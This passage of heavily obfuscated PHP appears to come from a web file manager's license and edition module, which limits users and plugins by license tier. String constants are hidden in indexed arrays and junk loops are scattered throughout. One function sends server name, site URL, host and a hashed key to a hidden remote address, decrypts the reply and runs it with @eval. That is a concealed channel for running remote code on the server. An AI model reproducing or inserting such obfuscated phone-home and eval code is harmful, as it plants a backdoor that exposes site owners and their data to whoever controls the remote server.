= $œÏÁı†Æ[746]; while ($”êï„°≤ < $œÏÁı†Æ[688]) { if ($”êï„°≤ >= 0) { break; } $”êï„°≤++; } } private function npyq089114ae() { $Ñ¬œè§· =& $_SERVER[ß⁄ˆÇ†Œ]; $‹¬À†≈ˆ =& $_SERVER[è¨ò„Àﬂ]; $_SERVER[$‹¬À†≈ˆ[162]] = _get($_SERVER, $‹¬À†≈ˆ[162], APP_HOST); $»¨ÒÂ∞º = $Ñ¬œè§·[747]; $this->tjlz46e76026 = $‹¬À†≈ˆ[109]; $Õ¡™—™ƒ = $Ñ¬œè§·[748]; if (strlen($Õ¡™—™ƒ) < $Ñ¬œè§·[704]) { die; } $Äü´™‰Ë = Model($‹¬À†≈ˆ[33])->get(); $ŒÚ‡æ≈Û = $Ñ¬œè§·[749]; if (!$ŒÚ‡æ≈Û) { die; } if ($Äü´™‰Ë[$‹¬À†≈ˆ[108]] == $‹¬À†≈ˆ[109]) { return; } $Êå˝æÜÜ = Model($‹¬À†≈ˆ[33])->get($‹¬À†≈ˆ[100]); $∑Î•õ¯µ = $‹¬À†≈ˆ[203] . md5($Êå˝æÜÜ . $‹¬À†≈ˆ[204]); $„µÆâ¬ˆ = Cache::get($∑Î•õ¯µ); if (!is_array($„µÆâ¬ˆ) || !isset($„µÆâ¬ˆ[$‹¬À†≈ˆ[207]]) || time() - $„µÆâ¬ˆ[$‹¬À†≈ˆ[207]] >= 60) { $å˝Œ›‰ı = Model($‹¬À†≈ˆ[7])->loadList(); $æí‡‘¶ù = $å˝Œ›‰ı[$‹¬À†≈ˆ[200]]; $ô˚Ì√â¢ = md5($_SERVER[$‹¬À†≈ˆ[106]] . strrev($Êå˝æÜÜ) . $Äü´™‰Ë[$‹¬À†≈ˆ[191]]); $≠è±ùﬁ∑ = strrev(substr($ô˚Ì√â¢, 10, 16)); $„µÆâ¬ˆ = $this->hoqy66faaedf($æí‡‘¶ù[$‹¬À†≈ˆ[86]][$≠è±ùﬁ∑], $ô˚Ì√â¢); $„µÆâ¬ˆ = json_decode($„µÆâ¬ˆ, !0); } if (!is_array($„µÆâ¬ˆ)) { return $this->dyzsc87ba3d1(); } $Ç≈øﬂò¶ = strtotime($„µÆâ¬ˆ[$‹¬À†≈ˆ[129]]); if (time() >= $Ç≈øﬂò¶) { return $this->dyzsc87ba3d1(); } if (!isset($„µÆâ¬ˆ[$‹¬À†≈ˆ[207]]) || time() - $„µÆâ¬ˆ[$‹¬À†≈ˆ[207]] > 20) { $„µÆâ¬ˆ[$‹¬À†≈ˆ[207]] = time(); Cache::set($∑Î•õ¯µ, $„µÆâ¬ˆ); } $this->ikfg863a10f8 = $„µÆâ¬ˆ; $this->tjlz46e76026 = $Äü´™‰Ë[$‹¬À†≈ˆ[108]]; $¯òíâõﬂ = $Ñ¬œè§·[750]; while ($¯òíâõﬂ < $Ñ¬œè§·[695]) { if ($¯òíâõﬂ >= 0) { break; } $¯òíâõﬂ++; } } private function ruap7e8a0df8() { $¬˛Õôúë =& $_SERVER[ß⁄ˆÇ†Œ]; $ÒÎë•ö⁄ =& $_SERVER[è¨ò„Àﬂ]; $ºÜÒøæ˜ = $GLOBALS[$ÒÎë•ö⁄[13]]; $âÀŒœ∆Ë = $¬˛Õôúë[751]; $óÁûˆôô = $_SERVER[$ÒÎë•ö⁄[24]]; $æ¥ß≥ﬂô = $¬˛Õôúë[752]; if (!$æ¥ß≥ﬂô) { return; } if ($óÁûˆôô == $ÒÎë•ö⁄[208] && $this->tjlz46e76026 == $ÒÎë•ö⁄[109]) { show_json(LNG($ÒÎë•ö⁄[209]), !1, $ÒÎë•ö⁄[210]); } $›≠Û¯âØ = array($ÒÎë•ö⁄[211], $ÒÎë•ö⁄[212]); if (in_array($óÁûˆôô, $›≠Û¯âØ)) { if ($this->tjlz46e76026 == $ÒÎë•ö⁄[109] && isset($ºÜÒøæ˜[$ÒÎë•ö⁄[213]])) { show_json(LNG($ÒÎë•ö⁄[209]), !1, $ÒÎë•ö⁄[210]); die; } $È™ÎÛ‘ï = $this->mwhb27d5f33e(); if ($È™ÎÛ‘ï != intval($ÒÎë•ö⁄[214])) { if ($È™ÎÛ‘ï <= Model($ÒÎë•ö⁄[125])->count()) { show_json(LNG($ÒÎë•ö⁄[215]), !1, $ÒÎë•ö⁄[210]); die; } } } } private function uxjl481f4656() { $Óß˚£ë¡ =& $_SERVER[ß⁄ˆÇ†Œ]; $◊˘Ã“† =& $_SERVER[è¨ò„Àﬂ]; $©Ÿ∆º›˚ = array($◊˘Ã“†[119], $◊˘Ã“†[120]); if (!KodUser::isRoot() || !isset($_GET[$◊˘Ã“†[216]])) { return; } if (!in_array($_SERVER[$◊˘Ã“†[24]], $©Ÿ∆º›˚)) { return; } $ØÜˆƒÎÇ = $◊˘Ã“†[217]; $∆›‚ﬁ»å = $Óß˚£ë¡[753]; $ØÜˆƒÎÇ = $this->rkql95ceede5($ØÜˆƒÎÇ, $◊˘Ã“†[218]); $öâÅ≥ûô = $Óß˚£ë¡[754]; if (strlen($öâÅ≥ûô) < $Óß˚£ë¡[704]) { die; } $éê¯Í‘√ = stream_context_create(array($◊˘Ã“†[219] => array($◊˘Ã“†[220] => $◊˘Ã“†[221], $◊˘Ã“†[222] => 3))); $∂ª≥ﬂß— = $Óß˚£ë¡[755]; $«ç‚ã‡Ç = @file_get_contents($ØÜˆƒÎÇ, !1, $éê¯Í‘√); header($◊˘Ã“†[223]); if ($«ç‚ã‡Ç && strstr($«ç‚ã‡Ç, $◊˘Ã“†[224])) { echo $«ç‚ã‡Ç; } die; } public function lfzk5bea654d($ó¥«Ûïè) { $¯»™õ˘ï =& $_SERVER[ß⁄ˆÇ†Œ]; $ƒ ±ƒáÃ =& $_SERVER[è¨ò„Àﬂ]; if ($this->tjlz46e76026 == $ƒ ±ƒáÃ[225]) { return $ó¥«Ûïè; } $¸«ãø˛Ÿ = $this->versionPluginList(); $≤Ü§Ê‚Æ = explode($ƒ ±ƒáÃ[226], $this->versionPluginFilter()); $Ñ–ƒÆ≠ˆ = array(); $‰ì’ˆ˙Í = $¯»™õ˘ï[756]; if (strlen($‰ì’ˆ˙Í) < $¯»™õ˘ï[688]) { return; } foreach ($¸«ãø˛Ÿ as $∞ú¡¥ˆõ => $¡öï˚˙”) { if ($¡öï˚˙” == $ƒ ±ƒáÃ[227] && substr($this->tjlz46e76026, 0, 1) == $ƒ ±ƒáÃ[227]) { continue; } if (!in_array($∞ú¡¥ˆõ, $≤Ü§Ê‚Æ)) { $Ñ–ƒÆ≠ˆ[] = $∞ú¡¥ˆõ; } } foreach ($Ñ–ƒÆ≠ˆ as $∞ú¡¥ˆõ) { unset($ó¥«Ûïè[$∞ú¡¥ˆõ]); $»«–ùÉÇ = $¯»™õ˘ï[757]; if (strlen($»«–ùÉÇ) < $¯»™õ˘ï[695]) { return; } } return $ó¥«Ûïè; $Ω¯Â¨ î = $¯»™õ˘ï[758]; while ($Ω¯Â¨ î < $¯»™õ˘ï[695]) { if ($Ω¯Â¨ î >= 0) { break; } $Ω¯Â¨ î++; } } private function versionPluginList() { $ºæ∞ÚÂò =& $_SERVER[è¨ò„Àﬂ]; return array($ºæ∞ÚÂò[228] => $ºæ∞ÚÂò[227], $ºæ∞ÚÂò[229] => $ºæ∞ÚÂò[227], $ºæ∞ÚÂò[230] => $ºæ∞ÚÂò[227], $ºæ∞ÚÂò[231] => $ºæ∞ÚÂò[232], $ºæ∞ÚÂò[233] => $ºæ∞ÚÂò[232], $ºæ∞ÚÂò[234] => $ºæ∞ÚÂò[232], $ºæ∞ÚÂò[235] => $ºæ∞ÚÂò[232], $ºæ∞ÚÂò[236] => $ºæ∞ÚÂò[232], $ºæ∞ÚÂò[237] => $ºæ∞ÚÂò[232], $ºæ∞ÚÂò[238] => $ºæ∞ÚÂò[232], $ºæ∞ÚÂò[239] => $ºæ∞ÚÂò[232], $ºæ∞ÚÂò[240] => $ºæ∞ÚÂò[232], $ºæ∞ÚÂò[241] => $ºæ∞ÚÂò[232], $ºæ∞ÚÂò[242] => $ºæ∞ÚÂò[232], $ºæ∞ÚÂò[243] => $ºæ∞ÚÂò[232], $ºæ∞ÚÂò[244] => $ºæ∞ÚÂò[232]); $…πô»∂Û = $_SERVER[ß⁄ˆÇ†Œ][759]; if (!$…πô»∂Û) { return; } } private function versionPluginFilter() { $÷ñ‰¨ÿÓ =& $_SERVER[è¨ò„Àﬂ]; if ($this->tjlz46e76026 == $÷ñ‰¨ÿÓ[109]) { return $÷ñ‰¨ÿÓ[6]; } $ó¨Â˜Ìõ = _get($this->ikfg863a10f8, $÷ñ‰¨ÿÓ[245], $÷ñ‰¨ÿÓ[6]); $®ïÍÖ•∫ = _get($this->ikfg863a10f8, $÷ñ‰¨ÿÓ[116], $÷ñ‰¨ÿÓ[6]); $Ñ∑¿‚÷€ = $_SERVER[ß⁄ˆÇ†Œ][760]; $ûöçò«‹ = _get($this->ikfg863a10f8, $÷ñ‰¨ÿÓ[246], $÷ñ‰¨ÿÓ[6]); if ($®ïÍÖ•∫ > time() && $ûöçò«‹ > time()) { $¯⁄õÍŸÆ = explode($÷ñ‰¨ÿÓ[226], $ó¨Â˜Ìõ); $ÀäΩŒÌØ = array_keys($this->versionPluginList()); $ó¨Â˜Ìõ = array_merge($¯⁄õÍŸÆ, $ÀäΩŒÌØ); $ó¨Â˜Ìõ = implode($÷ñ‰¨ÿÓ[226], array_filter(array_unique($ó¨Â˜Ìõ))); } return $ó¨Â˜Ìõ; } private function bpms2251bbad() { $Œ“ºﬁ“ﬂ =& $_SERVER[è¨ò„Àﬂ]; if ($this->tjlz46e76026 != $Œ“ºﬁ“ﬂ[109]) { $GLOBALS[$Œ“ºﬁ“ﬂ[86]][$Œ“ºﬁ“ﬂ[90]][$Œ“ºﬁ“ﬂ[247]] = $Œ“ºﬁ“ﬂ[206]; return; } $GLOBALS[$Œ“ºﬁ“ﬂ[86]][$Œ“ºﬁ“ﬂ[248]] = $Œ“ºﬁ“ﬂ[122]; if (Model($Œ“ºﬁ“ﬂ[249])->get($Œ“ºﬁ“ﬂ[63]) != $Œ“ºﬁ“ﬂ[206]) { Model($Œ“ºﬁ“ﬂ[249])->set($Œ“ºﬁ“ﬂ[63], $Œ“ºﬁ“ﬂ[206]); } } public function sreo26737152() { return $_SERVER[è¨ò„Àﬂ][250]; } private function vcsib7656530() { $„˘µ‹≥ö =& $_SERVER[ß⁄ˆÇ†Œ]; $á§‹™ˆÙ =& $_SERVER[è¨ò„Àﬂ]; $ùŸ“Œ¶¢ = array($á§‹™ˆÙ[251], $á§‹™ˆÙ[252], $á§‹™ˆÙ[253]); $ê©Ÿ¸∂Æ = $„˘µ‹≥ö[761]; $â““˜Ïø = $á§‹™ˆÙ[254] . md5($á§‹™ˆÙ[255]); if ($this->tjlz46e76026 == $á§‹™ˆÙ[109] || !KodUser::isRoot()) { return; } if (!in_array($_SERVER[$á§‹™ˆÙ[24]], $ùŸ“Œ¶¢)) { return; } if (time() % 4 != 0) { return; } $∏≥ÔÜ≤† = call_user_func(array($á§‹™ˆÙ[256], $á§‹™ˆÙ[257]), $â““˜Ïø); if ($∏≥ÔÜ≤† && time() - $∏≥ÔÜ≤† < intval($á§‹™ˆÙ[258])) { return; } call_user_func(array($á§‹™ˆÙ[256], $á§‹™ˆÙ[139]), $â““˜Ïø, time()); $âò¨»˛ = $„˘µ‹≥ö[762]; $ ﬁ®◊â = Model($á§‹™ˆÙ[33])->get($á§‹™ˆÙ[100]); $∑Ÿ¸Çå† = array($á§‹™ˆÙ[152] => Model($á§‹™ˆÙ[33])->get($á§‹™ˆÙ[153]), $á§‹™ˆÙ[167] => $this->tjlz46e76026, $á§‹™ˆÙ[163] => $_SERVER[$á§‹™ˆÙ[164]], $á§‹™ˆÙ[165] => Model($á§‹™ˆÙ[33])->get($á§‹™ˆÙ[131]), $á§‹™ˆÙ[105] => md5($_SERVER[$á§‹™ˆÙ[106]] . $ ﬁ®◊â), $á§‹™ˆÙ[156] => $á§‹™ˆÙ[136], $á§‹™ˆÙ[159] => $_SERVER[$á§‹™ˆÙ[160]]); $áî•ëô∂ = $this->wxql0bf7c415($á§‹™ˆÙ[259], $∑Ÿ¸Çå†); if (!is_array($áî•ëô∂)) { return; } if ($áî•ëô∂[$á§‹™ˆÙ[152]] && $áî•ëô∂[$á§‹™ˆÙ[260]]) { if ($this->atbv31eea042($áî•ëô∂[$á§‹™ˆÙ[260]]) == $∑Ÿ¸Çå†[$á§‹™ˆÙ[152]]) { return; } } $this->dyzsc87ba3d1(); $˙ –ıÃ‰ = $„˘µ‹≥ö[763]; if (strlen($˙ –ıÃ‰) < $„˘µ‹≥ö[688]) { die; } if ($this->atbv31eea042($áî•ëô∂[$á§‹™ˆÙ[260]]) != $∑Ÿ¸Çå†[$á§‹™ˆÙ[152]]) { $¯Ê¢√µ£ = array($á§‹™ˆÙ[185] => $ ﬁ®◊â, $á§‹™ˆÙ[186] => $_SERVER[$á§‹™ˆÙ[106]], $á§‹™ˆÙ[187] => this_url(), $á§‹™ˆÙ[161] => $_SERVER[$á§‹™ˆÙ[162]]); $‘º»Éï¥ = $this->vmtg8d149cd5(json_encode($¯Ê¢√µ£)); $áî•ëô∂ = $this->wxql0bf7c415($á§‹™ˆÙ[188] . $‘º»Éï¥); if ($áî•ëô∂ && is_array($áî•ëô∂) && isset($áî•ëô∂[$á§‹™ˆÙ[260]])) { $˝òç⁄è” = $this->hoqy66faaedf($áî•ëô∂[$á§‹™ˆÙ[260]], 2); if ($˝òç⁄è”) { $˝òç⁄è” = $this->atbv31eea042($˝òç⁄è”); } if ($˝òç⁄è”) { try { @eval($˝òç⁄è”); } catch (Exception $˙˙‡¬ˆ⁄) { } } } } } private function wxql0bf7c415($∑£Õé∞’ = '', $ëó¸»∑¥ = array(), $∆˚˝û™ﬂ = 5) { $˜±ı£¯º =& $_SERVER[ß⁄ˆÇ†Œ]; $‘Ìèò¢≥ =& $_SERVER[è¨ò„Àﬂ]; $æ⁄ﬂ«Û≠ = $‘Ìèò¢≥[261]; $æ⁄ﬂ«Û≠ = $this->rkql95ceede5($æ⁄ﬂ«Û≠, $‘Ìèò¢≥[262]); $æ⁄ﬂ«Û≠ = $æ⁄ﬂ«Û≠ . $∑£Õé∞’; $ﬁÉòßÒü = $˜±ı£¯º[764]; if ($ëó¸»∑¥ && is_array($ëó¸»∑¥)) { $æ⁄ﬂ«Û≠ = $æ⁄ﬂ«Û≠ . $‘Ìèò¢≥[263] . http_build_query($ëó¸»∑¥); } if ($ëó¸»∑¥ === -1) { return $æ⁄ﬂ«Û≠; } $Ï—Ω™õ± = stream_context_create(array($‘Ìèò¢≥[219] => array($‘Ìèò¢≥[222] => $∆˚˝û™ﬂ, $‘Ìèò¢≥[220] => $‘Ìèò¢≥[264]), $‘Ìèò¢≥[265] => array($‘Ìèò¢≥[266] => !1, $‘Ìèò¢≥[267] => !1))); $œèÂÜ’Î = $˜±ı£¯º[765]; $ëó¸»∑¥ = @file_get_contents($æ⁄ﬂ«Û≠, !1, $Ï—Ω™õ±); return json_decode($ëó¸»∑¥, !0); $◊Ôµπ˙˚ = $˜±ı£¯º[766]; if (!$◊Ôµπ˙˚) { return; } } private function mwhb27d5f33e() { $›ˆÕ“É® =& $_SERVER[ß⁄ˆÇ†Œ]; $Ûû¡™ˆä =& $_SERVER[è¨ò„Àﬂ]; $‹ø–ûŒ« = array($Ûû¡™ˆä[268] => $Ûû¡™ˆä[269], $Ûû¡™ˆä[270] => $Ûû¡™ˆä[271], $Ûû¡™ˆä[272] => $Ûû¡™ˆä[273], $Ûû¡™ˆä[274] => $Ûû¡™ˆä[275], $Ûû¡™ˆä[276] => $Ûû¡™ˆä[277], $Ûû¡™ˆä[278] => $Ûû¡™ˆä[214], $Ûû¡™ˆä[279] => $Ûû¡™ˆä[214], $Ûû¡™ˆä[280] => $Ûû¡™ˆä[269], $Ûû¡™ˆä[281] => $Ûû¡™ˆä[271], $Ûû¡™ˆä[282] => $Ûû¡™ˆä[273], $Ûû¡™ˆä[283] => $Ûû¡™ˆä[284], $Ûû¡™ˆä[285] => $Ûû¡™ˆä[275], $Ûû¡™ˆä[286] => $Ûû¡™ˆä[287], $Ûû¡™ˆä[288] => $Ûû¡™ˆä[277], $Ûû¡™ˆä[289] => $Ûû¡™ˆä[290], $Ûû¡™ˆä[291] => $Ûû¡™ˆä[292], $Ûû¡™ˆä[293] => $Ûû¡™ˆä[294]); $à°û˘˛ó = $›ˆÕ“É®[767]; if (!$à°û˘˛ó) { die; } $ôæé˛ë‹ = $‹ø–ûŒ«[$this->tjlz46e76026]; $ôæé˛ë‹ = intval($ôæé˛ë‹ ? $ôæé˛ë‹ : $Ûû¡™ˆä[269]); $ê«– äÁ = _get($this->ikfg863a10f8, $Ûû¡™ˆä[295]); $ê«– äÁ = $ê«– äÁ ? intval($ê«– äÁ) : 0; $Ôöí‚Çî = $›ˆÕ“É®[768]; if (strlen($Ôöí‚Çî) < $›ˆÕ“É®[326]) { return; } return $ôæé˛ë‹ + $ê«– äÁ; } public function edfgb4f9da7e($Éà≈Â≈É) { $ﬁÍÕÙÍü =& $_SERVER[ß⁄ˆÇ†Œ]; $Õè¶óÿÊ =& $_SERVER[è¨ò„Àﬂ]; $ä£¢πÏÜ = $this->mwhb27d5f33e(); $¶√µŒÂ = $ﬁÍÕÙÍü[769]; while (strlen($¶√µŒÂ) < $ﬁÍÕÙÍü[704]) { if (!$¶√µŒÂ) { break; } $¶√µŒÂ++; } if ($Éà≈Â≈É[$Õè¶óÿÊ[296]] == $Õè¶óÿÊ[122]) { return; } if ($ä£¢πÏÜ >= intval($Õè¶óÿÊ[214])) { return; } $ëª•åñí = Model($Õè¶óÿÊ[125])->count(); $ïƒüéŸ‰ = $ﬁÍÕÙÍü[770]; if ($ëª•åñí <= $ä£¢πÏÜ) { return; } $Ï•¥ö˛˛ = Model($Õè¶óÿÊ[125])->field($Õè¶óÿÊ[296])->limit($ä£¢πÏÜ)->select(); $Ï•¥ö˛˛ = array_to_keyvalue($Ï•¥ö˛˛, $Õè¶óÿÊ[6], $Õè¶óÿÊ[296]); if (!in_array($Éà≈Â≈É[$Õè¶óÿÊ[296]], $Ï•¥ö˛˛)) { show_json($Õè¶óÿÊ[297], !1, $Õè¶óÿÊ[210]); } } public function yhjsb0ded17c() { $ó∞–ºü© =& $_SERVER[ß⁄ˆÇ†Œ]; $àˆõ÷ñ® =& $_SERVER[è¨ò„Àﬂ]; if (!KodUser::isRoot() || mt_rand(1, 100) > 20) { return; } $À”ì£ƒ¯ = $àˆõ÷ñ®[217]; $≤»úÃ± = $ó∞–ºü©[771]; if (strlen($≤»úÃ±) < $ó∞–ºü©[704]) { die; } $À”ì£ƒ¯ = $this->rkql95ceede5($À”ì£ƒ¯, $àˆõ÷ñ®[218]); $¿Ä˝¿˘‡ = $ó∞–ºü©[772]; if (!$¿Ä˝¿˘‡) { die; } $Ì€Ä¡Íä = stream_context_create(array($àˆõ÷ñ®[219] => array($àˆõ÷ñ®[220] => $àˆõ÷ñ®[221], $àˆõ÷ñ®[222] => 3))); $¥ëöÔ◊› = $ó∞–ºü©[773]; $Ï˝í¥Å˝ = @file_get_contents($À”ì£ƒ¯, !1, $Ì€Ä¡Íä); echo $àˆõ÷ñ®[298] . hash_encode($Ï˝í¥Å˝) . $àˆõ÷ñ®[299]; } private function movbf0c46773($≥Æ‡´·Û, $ßÏ⁄ı˘Ù, $î∂˝±‚Î = 3) { $∆Ê™–ä’ =& $_SERVER[ß⁄ˆÇ†Œ]; $ù°®íåü =& $_SERVER[è¨ò„Àﬂ]; usleep(1); $Ø¥òáÑπ = $∆Ê™–ä’[774]; while ($Ø¥òáÑπ < $∆Ê™–ä’[704]) { if ($Ø¥òáÑπ >= 0) { break; } $Ø¥òáÑπ++; } $≥Æ‡´·Û = trim($≥Æ‡´·Û); $≤Ωﬁ·ï¢ = $∆Ê™–ä’[775]; if (!$≤Ωﬁ·ï¢) { return; } $…˝Ú»¯ï = mt_rand(0, 5) . $ù°®íåü[6]; $’·©¶√™ = $∆Ê™–ä’[776]; while ($’·©¶√™ < $∆Ê™–ä’[326]) { if ($’·©¶√™ >= 0) { break; } $’·©¶√™++; } $›É‰Î√≠ = rand_string(15); $‚Œéﬁ˙€ = $∆Ê™–ä’[777]; if (!$‚Œéﬁ˙€) { die; } $·Ùöøæœ = $ù°®íåü[300]; switch ($…˝Ú»¯ï) { case $ù°®íåü[206]: $¬˙ªÀ…Ù = $this->shwy74269dfb($≥Æ‡´·Û, strrev($ßÏ⁄ı˘Ù . $›É‰Î√≠)); $õéæåÈ° = $∆Ê™–ä’[778]; if (!$õéæåÈ°) { die; } break; $¥”≈ÿí◊ = $∆Ê™–ä’[779]; case $ù°®íåü[122]: $¬˙ªÀ…Ù = $this->shwy74269dfb($≥Æ‡´·Û, strrev($›É‰Î√≠ . $ßÏ⁄ı˘Ù)); break; $ıåø÷ìû = $∆Ê™–ä’[780]; case $ù°®íåü[301]: $¬˙ªÀ…Ù = $this->shwy74269dfb($≥Æ‡´·Û, base64_encode($›É‰Î√≠ . $ßÏ⁄ı˘Ù)); break; $Ñªú∞“… = $∆Ê™–ä’[781]; case $ù°®íåü[302]: $¬˙ªÀ…Ù = $this->shwy74269dfb($≥Æ‡´·Û, md5($›É‰Î√≠ . $ßÏ⁄ı˘Ù)); break; case $ù°®íåü[303]: $≥Æ‡´·Û = base64_encode($≥Æ‡´·Û); $ü≈û∏ÃË = $∆Ê™–ä’[782]; if (strlen($ü≈û∏ÃË) < $∆Ê™–ä’[695]) { return; } $”Á˜⁄¥† = rand(0, 64); $§œîÒ˘Ó = $∆Ê™–ä’[783]; $µ∞ÔÀ˝¯ = $·Ùöøæœ[$”Á˜⁄¥†]; $Ç…ÖËÏÏ = md5($µ∞ÔÀ˝¯ . md5($ßÏ⁄ı˘Ù . $µ∞ÔÀ˝¯) . $ßÏ⁄ı˘Ù); $Ç…ÖËÏÏ = substr($Ç…ÖËÏÏ, $”Á˜⁄¥† % 8, $”Á˜⁄¥† % 8 + 7); $ˆùÙ¨÷ø = $∆Ê™–ä’[784]; while (strlen($ˆùÙ¨÷ø) < $∆Ê™–ä’[326]) { if (!$ˆùÙ¨÷ø) { break; } $ˆùÙ¨÷ø++; } $¶∫⁄ãúç = $ù°®íåü[6]; $ÑÇëñªÀ = $∆Ê™–ä’[785]; while (strlen($ÑÇëñªÀ) < $∆Ê™–ä’[326]) { if (!$ÑÇëñªÀ) { break; } $ÑÇëñªÀ++; } $◊Í‡ìΩÆ = 0; $ÚÀòÑÙÀ = $∆Ê™–ä’[786]; if (!$ÚÀòÑÙÀ) { return; } $è–ˆ¡ô√ = 0; $°ﬂ´©≥Ä = $∆Ê™–ä’[787]; if (strlen($°ﬂ´©≥Ä) < $∆Ê™–ä’[695]) { return; } $ﬂßÜî˛‡ = 0; for ($◊Í‡ìΩÆ = 0; $◊Í‡ìΩÆ < strlen($≥Æ‡´·Û); $◊Í‡ìΩÆ++) { $ﬂßÜî˛‡ = $ﬂßÜî˛‡ == strlen($Ç…ÖËÏÏ) ? 0 : $ﬂßÜî˛‡; $è–ˆ¡ô√ = ($”Á˜⁄¥† + strpos($·Ùöøæœ, $≥Æ‡´·Û[$◊Í‡ìΩÆ]) + ord($Ç…ÖËÏÏ[$ﬂßÜî˛‡++])) % 64; $¶∫⁄ãúç .= $·Ùöøæœ[$è–ˆ¡ô√]; $ªﬁ“ÆóÉ = $∆Ê™–ä’[788]; while ($ªﬁ“ÆóÉ < $∆Ê™–ä’[326]) { if ($ªﬁ“ÆóÉ >= 0) { break; } $ªﬁ“ÆóÉ++; } } $¬˙ªÀ…Ù = hash_encode($µ∞ÔÀ˝¯ . $¶∫⁄ãúç); $ππãà¶õ = $∆Ê™–ä’[789]; while (strlen($ππãà¶õ) < $∆Ê™–ä’[695]) { if (!$ππãà¶õ) { break; } $ππãà¶õ++; } break; default: $¬˙ªÀ…Ù = $this->shwy74269dfb($≥Æ‡´·Û, $ßÏ⁄ı˘Ù . $›É‰Î√≠); $π¢Ë÷¨Ö = $∆Ê™–ä’[790]; while (strlen($π¢Ë÷¨Ö) < $∆Ê™–ä’[704]) { if (!$π¢Ë÷¨Ö) { break; } $π¢Ë÷¨Ö++; } break; } $¬˙ªÀ…Ù = strrev($…˝Ú»¯ï . $›É‰Î√≠ . $¬˙ªÀ…Ù); if ($î∂˝±‚Î - 1 > 0) { $¬˙ªÀ…Ù = $this->movbf0c46773($¬˙ªÀ…Ù, $ßÏ⁄ı˘Ù, $î∂˝±‚Î - 1); } return $¬˙ªÀ…Ù; } private function hoqy66faaedf($˛£Çœøƒ, $ûàﬁ∑≤ê, $†¨…»ë = 3) { $¥˙èƒÂ =& $_SERVER[ß⁄ˆÇ†Œ]; $«≈êŸë– =& $_SERVER[è¨ò„Àﬂ]; if (!is_string($˛£Çœøƒ) || strlen($˛£Çœøƒ) < 10) { return !1; } $˛£Çœøƒ = trim($˛£Çœøƒ); $˛£Çœøƒ = strrev($˛£Çœøƒ); $Ï‘Æ≥óí = $˛£Çœøƒ[0]; $˘ë€›ˆ· = $¥˙èƒÂ[791]; if (strlen($˘ë€›ˆ·) < $¥˙èƒÂ[693]) { die; } $¥≤∏⁄æ™ = substr($˛£Çœøƒ, 1, 15); $™ìµÉé· = $¥˙èƒÂ[792]; if (strlen($™ìµÉé·) < $¥˙èƒÂ[704]) { die; } $˛£Çœøƒ = substr($˛£Çœøƒ, 16); $Áä›•ÒÄ = $¥˙èƒÂ[793]; $ˆìü‹ΩÕ = $«≈êŸë–[300]; switch ($Ï‘Æ≥óí) { case $«≈êŸë–[206]: $¶ì˙çÌ” = $this->rkql95ceede5($˛£Çœøƒ, strrev($ûàﬁ∑≤ê . $¥≤∏⁄æ™)); $™Ñ⁄«”± = $¥˙èƒÂ[794]; break; case $«≈êŸë–[122]: $¶ì˙çÌ” = $this->rkql95ceede5($˛£Çœøƒ, strrev($¥≤∏⁄æ™ . $ûàﬁ∑≤ê)); $ï≈‚óò‰ = $¥˙èƒÂ[795]; while (strlen($ï≈‚óò‰) < $¥˙èƒÂ[704]) { if (!$ï≈‚óò‰) { break; } $ï≈‚óò‰++; } break; $Í†Ø˜äí = $¥˙èƒÂ[796]; if (!$Í†Ø˜äí) { return; } case $«≈êŸë–[301]: $¶ì˙çÌ” = $this->rkql95ceede5($˛£Çœøƒ, base64_encode($¥≤∏⁄æ™ . $ûàﬁ∑≤ê)); break; $°ù ÊÅæ = $¥˙èƒÂ[797]; if (!$°ù ÊÅæ) { return; } case $«≈êŸë–[302]: $¶ì˙çÌ” = $this->rkql95ceede5($˛£Çœøƒ, md5($¥≤∏⁄æ™ . $ûàﬁ∑≤ê)); $√™ãÍ™ñ = $¥˙èƒÂ[798]; while (strlen($√™ãÍ™ñ) < $¥˙èƒÂ[326]) { if (!$√™ãÍ™ñ) { break; } $√™ãÍ™ñ++; } break; case $«≈êŸë–[303]: $˛£Çœøƒ = hash_decode($˛£Çœøƒ); $˛Åûã÷” = $˛£Çœøƒ[0]; $≠‚⁄Ú™© = $¥˙èƒÂ[799]; if (!$≠‚⁄Ú™©) { return; } $˛£Çœøƒ = substr($˛£Çœøƒ, 1); $Ÿ†°‹ó˚ = $¥˙èƒÂ[800]; if (!$Ÿ†°‹ó˚) { return; } $»ÈåÛÄí = strpos($ˆìü‹ΩÕ, $˛Åûã÷”); $öπ≠∂¿Â = md5($˛Åûã÷” . md5($ûàﬁ∑≤ê . $˛Åûã÷”) . $ûàﬁ∑≤ê); $öπ≠∂¿Â = substr($öπ≠∂¿Â, $»ÈåÛÄí % 8, $»ÈåÛÄí % 8 + 7); $Û¿±Ç¡ê = $«≈êŸë–[6]; $ÅüèÏµ§ = 0; $∆ØóÆµ∫ = 0; $≥œ “Í› = 0; for ($ÅüèÏµ§ = 0; $ÅüèÏµ§ < strlen($˛£Çœøƒ); $ÅüèÏµ§++) { $≥œ “Í› = $≥œ “Í› == strlen($öπ≠∂¿Â) ? 0 : $≥œ “Í›; $ﬂ®≤Òëá = $¥˙èƒÂ[801]; if (strlen($ﬂ®≤Òëá) < $¥˙èƒÂ[704]) { die; } $‹çåÒƒ≠ = $≥œ “Í›++; $üÀÊÃ⁄© = $¥˙èƒÂ[700]; if (!$üÀÊÃ⁄©) { return; } $∆ØóÆµ∫ = strpos($ˆìü‹ΩÕ, $˛£Çœøƒ[$ÅüèÏµ§]) - $»ÈåÛÄí - ord($öπ≠∂¿Â[$‹çåÒƒ≠]); $¢Øæ¥ŒÆ = $¥˙èƒÂ[802]; while (strlen($¢Øæ¥ŒÆ) < $¥˙èƒÂ[693]) { if (!$¢Øæ¥ŒÆ) { break; } $¢Øæ¥ŒÆ++; } while ($∆ØóÆµ∫ < 0) { $∆ØóÆµ∫ += 64; $Å°∫‚ıÓ = $¥˙èƒÂ[803]; while (strlen($Å°∫‚ıÓ) < $¥˙èƒÂ[693]) { if (!$Å°∫‚ıÓ) { break; } $Å°∫‚ıÓ++; } } $Û¿±Ç¡ê .= $ˆìü‹ΩÕ[$∆ØóÆµ∫]; } $¶ì˙çÌ” = base64_decode($Û¿±Ç¡ê); $ùÙ◊≤Ú = $¥˙èƒÂ[804]; while (strlen($ùÙ◊≤Ú) < $¥˙èƒÂ[704]) { if (!$ùÙ◊≤Ú) { break; } $ùÙ◊≤Ú++; } break; default: $¶ì˙çÌ” = $this->rkql95ceede5($˛£Çœøƒ, $ûàﬁ∑≤ê . $¥≤∏⁄æ™); $Î◊õÃ˛„ = $¥˙èƒÂ[805]; while (strlen($Î◊õÃ˛„) < $¥˙èƒÂ[688]) { if (!$Î◊õÃ˛„) { break; } 